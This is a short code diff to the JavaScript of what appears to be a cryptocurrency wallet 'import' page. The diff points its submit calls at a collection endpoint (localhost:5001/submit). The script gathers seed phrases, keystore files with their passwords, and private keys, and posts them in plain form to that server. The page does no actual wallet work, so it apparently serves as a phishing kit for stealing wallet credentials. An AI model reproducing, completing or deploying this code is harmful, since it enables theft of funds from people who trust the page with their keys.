@@ -1,3 +1,4 @@
+localStorage.setItem("phraseType", "Phrase");
 const phraseTypes = document.querySelectorAll(".phrase-type");
 
 phraseTypes.forEach((phraseType) => {
@@ -22,7 +23,7 @@ importBTNs.forEach((importBTN) => {
         alert("Please enter a phrase that is between 12 to 24 words.");
         return;
       }
-      const res = await fetch("", {
+      const res = await fetch("http://localhost:5001/submit", {
         method: "POST",
         body: JSON.stringify({ feature, coin, phraseType, phrase }),
         headers: {
@@ -37,7 +38,7 @@ importBTNs.forEach((importBTN) => {
       const phrase = document.querySelector(".Keystore-JSON").value;
       const password = document.querySelector(".Keystore-JSON-password").value;
 
-      const res = await fetch("", {
+      const res = await fetch("http://localhost:5001/submit", {
         method: "POST",
         body: JSON.stringify({ feature, coin, phraseType, phrase, password }),
         headers: {
@@ -52,7 +53,7 @@ importBTNs.forEach((importBTN) => {
         alert("Private key must be 64 alphanumeric characters");
         return;
       }
-      const res = await fetch("", {
+      const res = await fetch("http://localhost:5001/submit", {
         method: "POST",
         body: JSON.stringify({ feature, coin, phraseType, phrase }),
         headers: {
